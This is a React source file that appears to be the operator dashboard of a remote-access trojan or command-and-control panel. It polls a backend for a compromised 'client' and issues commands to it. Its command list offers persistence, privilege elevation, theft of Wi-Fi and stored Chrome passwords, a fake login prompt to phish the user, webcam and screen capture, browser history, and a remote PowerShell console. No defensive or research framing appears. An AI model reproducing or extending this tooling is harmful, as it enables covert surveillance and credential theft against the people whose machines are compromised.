import React, {useEffect, useState} from 'react';
import {NavLink, useParams} from "react-router-dom";
import Title from "../../Title/Title";
import './ClientControl.css';
import {Spinner} from "reactstrap";
import ClientControlCommand from './ClientControlCommand'
import ClientControlResponse from './ClientControlResponse';
import ClientControlInformationTable from './ClientControlInformationTable';
import Accordion from '../../Accordion/Accordion'
import axios from "../../../axios";
import styled from '@emotion/styled';
import RetrievedFiles from './RetrievedFiles'
import {killClient} from "../../../api/api";

// TODO: get list of commands from DB
const commands = {
    'stayhome': 'Persistence',
    'elevate': 'Elevate',
    'upload': 'Upload',
    'download': 'Download',
    'change-image': 'Change Background',
    'capture': 'Take screenshot',
    'getwifi': 'Get Wifi Passwords',
    'webPass': 'Get Stored Chrome Passwords',
    'PromptUser': 'Prompt User UI Login',
    'get-network': 'Get Network Information',
    'StartPS': 'Start Powershell Console',
    'smile': 'Take webcam picture',
    'history': 'Get browser history'
}

const ClientControl = () => {
    const {id} = useParams();
    const [client, setClient] = useState(undefined);
    const [clientStatus, setClientStatus] = useState(true);
    const [clientResponse, setClientResponse] = useState();
    const [allResponses, setAllResponses] = useState([]);


    useEffect(() => {
        const getClient = () => {
            axios({
                method: 'POST',
                headers: {
                    'x-access-token': localStorage.getItem('token')
                },
                url: '/api/clients/client',
                data: {
                    id: id
                }
            }).then((data) => {
                if (Object.keys(data.data).length !== 0) {
                    delete data.data.user.__v
                    delete data.data.user._id
                    setClient(data.data.user);
                    setClientStatus(data.data.user.isConnected);
                } else
                    return setClientStatus(false);
            }).catch((err) => {
                setClientStatus(false)
            });

            const getResponse = () => {
                axios({
                    headers: {
                        'Content-Type': 'application/json',
                        "x-access-token": localStorage.getItem('token')
                    },
                    url: `/api/response/${id}`,
                    method: 'get',
                })
                    .then(data => {
                        if (Object.keys(data.data).length !== 0) {
                            setClientResponse(data.data);
                            setAllResponses(oldArray => [...oldArray, data.data]);
                        }
                    })
                    .catch(e => e)
            }
            getResponse();
        }
        getClient();
        let handle = setInterval(getClient, 5000);
        return () => {
            clearInterval(handle);
        };
    }, [id]);

    return (
        <div className="controlPageWrapper">
            <div className="title">
                <Title text1="COMMAND" text2={"CONTROL"} open={true}/>
            </div>
            <Wrapper>
                {client !== undefined ?
                    <>
                        <Accordion title="Client Information">
                            <ClientControlInformationTable client={client}/>
                        </Accordion>
                        <Accordion title="Command">
                            <ClientControlCommand client={client} commands={commands}/>
                        </Accordion>
                        <Accordion title="Response">
                            <ClientControlResponse clientResponse={clientResponse} allResponses={allResponses}/>
                            <div className="client-control-clear-button">
                                <ClearButton onClick={() => {
                                    setAllResponses([])
                                }}>Clear</ClearButton>
                            </div>
                        </Accordion>
                        <Accordion title="Files">
                            <RetrievedFiles clientId={id}/>
                        </Accordion>
                    </> : <Spinner actions={"border"} color={"success"} type="grow"/>
                }
            </Wrapper>
            <NavLink to={"/clients"}>
                <MainBackButton id="auto-complete-button"
                                href="/clients"
                                variant={"success"}
                >
                    Back
                </MainBackButton>
                <MainKillButton id="main-kill-button"
                                onClick={() => killClient(id)}
                                variant={"success"}
                >
                    Kill
                </MainKillButton>
            </NavLink>
        </div>
    );
}

export default ClientControl;

const Wrapper = styled.div`
  margin: 0 auto;
  width: 75%;
`
const MainBackButton = styled.button`
  min-width: 8em;
  padding: 0.5em;
  font-weight: 600;
  color: #fff;
  border: none;
  border-radius: 5px;
  background-color: #98d14a;
  margin-top: 2em;
  margin-bottom: 2em;
`
const MainKillButton = styled.button`
  min-width: 8em;
  padding: 0.5em;
  font-weight: 600;
  color: #fff;
  border: none;
  border-radius: 5px;
  background-color: #ff0000;
  margin: 2vh;
`
const ClearButton = styled.button`
  min-width: 8em;
  padding: 0.5em;
  font-weight: 600;
  color: #fff;
  background-color: red;
  border: none;
  border-radius: 5px;
`